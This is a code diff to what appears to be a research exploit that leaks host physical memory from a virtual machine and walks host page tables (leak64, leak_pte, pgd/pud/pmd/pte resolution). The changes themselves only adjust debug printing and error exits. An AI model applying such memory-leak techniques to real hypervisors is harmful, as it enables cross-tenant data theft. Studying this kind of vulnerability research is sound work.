@@ -41,12 +41,16 @@ u64 leak64(hpa_t base, hpa_t pa)
 	const int verbose = 1;
 	if (verbose) {
 		u64 true = hc_read_pa(pa);
-		printf("  leak64: leaked: %lx, true = %lx (%s)\n", val, true, true != val ? "ERROR" : "OK");
-		if ((true ^ val) & val) {
-			printf("\nUNRECONCILABLE ERROR!\n");
-			dump(true ^ val);
-			dump((true ^ val) & val);
-			printf("NOTE: we leaked a non-zero nibble where we are not supposed to...\n");
+		if (true != val) {
+			printf("\n{leak64: leaked: %lx, true = %lx (%s)}   ", val, true, true != val ? "ERROR" : "OK");
+			if ((true ^ val) & val) {
+				printf("\nUNRECONCILABLE ERROR!\n");
+				dump(true ^ val);
+				dump((true ^ val) & val);
+				printf("NOTE: we leaked a non-zero nibble where we are not supposed to...\n");
+				printf("\n\n\n\n\n\n\n\n\n\n\n");
+				exit(1);
+			}
 		}
 	}
 #endif
@@ -67,12 +71,16 @@ pte_t leak_pte(hpa_t base, hpa_t pa)
 	const int verbose = 1;
 	if (verbose) {
 		u64 true = hc_read_pa(pa) & 0xffffffffff;
-		printf("leak_pte: leaked: %lx, true = %lx (%s)\n", pte, true, true != pte ? "ERROR" : "OK");
-		if ((true ^ pte) & pte) {
-			printf("\nUNRECONCILABLE ERROR!\n");
-			dump(true ^ pte);
-			dump((true ^ pte) & pte);
-			printf("NOTE: we leaked a non-zero nibble where we are not supposed to...\n");
+		if (pte != true) {
+			printf("\n{leak_pte: leaked: %lx, true = %lx (%s)}   ", pte, true, true != pte ? "ERROR" : "OK");
+			if ((true ^ pte) & pte) {
+				printf("\nUNRECONCILABLE ERROR!\n");
+				dump(true ^ pte);
+				dump((true ^ pte) & pte);
+				printf("NOTE: we leaked a non-zero nibble where we are not supposed to...\n");
+				printf("\n\n\n\n\n\n\n\n\n\n\n");
+				exit(1);
+			}
 		}
 	}
 #endif
@@ -98,7 +106,7 @@ retry_pgd:
 	if (verbose >= 2) dumpp(pgd_pa);
 	pte_t pgd = leak_pte(base, pgd_pa);
 	if (verbose >= 2) dumpp(pgd);
-	if (verbose == 1) printf(" --> pgd %10lx ", pgd);
+	if (verbose == 1) { printf(" --> pgd %10lx ", pgd); fflush(stdout); }
 	if (!(((pgd & 0xfff) == 0x067) || ((pgd & 0xfff) == 0x907))) {
 		if (verbose == 1) printf("\n\t--> ");
 		goto retry_pgd;
@@ -118,7 +126,7 @@ retry_pud:
 	if (verbose >= 2) dumpp(pud_pa);
 	pte_t pud = leak_pte(base, pud_pa);
 	if (verbose >= 2) dumpp(pud);
-	if (verbose == 1) printf("pud %10lx ", pud);
+	if (verbose == 1) { printf("pud %10lx ", pud); fflush(stdout); }
 	if (!(((pud & 0xfff) == 0x067) || ((pud & 0xfff) == 0x907))) {
 		if (verbose == 1) printf("\n\t--> ");
 		goto retry_pud;
@@ -126,7 +134,7 @@ retry_pud:
 	if (IS_HUGE(pud)) {
 		hpa_t pa = (pud & BITS_MASK(52, 30)) | BITS(va, 30, 0);
 		if (verbose >= 2) dumpp(pa);
-		if (verbose == 1) printf("pa %10lx\n", pa);
+		if (verbose == 1) { printf("pa %10lx\n", pa); fflush(stdout); }
 		return pa;
 	}
 
@@ -144,7 +152,7 @@ retry_pmd:
 	if (verbose >= 2) dumpp(pmd_pa);
 	pte_t pmd = leak_pte(base, pmd_pa);
 	if (verbose >= 2) dumpp(pmd);
-	if (verbose == 1) printf("pmd %10lx ", pmd);
+	if (verbose == 1) { printf("pmd %10lx ", pmd); fflush(stdout); }
 	if (!(((pmd & 0xfff) == 0x067) || ((pmd & 0xfff) == 0x907) || ((pmd & 0xfff) == 0xbf7))) {
 		if (verbose == 1) printf("\n\t--> ");
 		goto retry_pmd;
@@ -152,7 +160,7 @@ retry_pmd:
 	if (IS_HUGE(pmd)) {
 		hpa_t pa = (pmd & BITS_MASK(52, 21)) | BITS(va, 21, 0);
 		if (verbose >= 2) dumpp(pa);
-		if (verbose == 1) printf("pa %10lx\n", pa);
+		if (verbose == 1) { printf("pa %10lx\n", pa); fflush(stdout); }
 		return pa;
 	}
 
@@ -174,10 +182,10 @@ retry_pte:
 		goto retry_pmd;
 	}
 	if (verbose >= 2) dumpp(pte);
-	if (verbose == 1) printf("pte %10lx ", pte);
+	if (verbose == 1) { printf("pte %10lx ", pte); fflush(stdout); }
 	hpa_t pa = (pte & PFN_MASK) | BITS(va, 12, 0);
 	if (verbose >= 2) dumpp(pa);
-	if (verbose == 1) printf("pa %10lx\n", pa);
+	if (verbose == 1) { printf("pa %10lx\n", pa); fflush(stdout); }
 	return pa;
 }
 
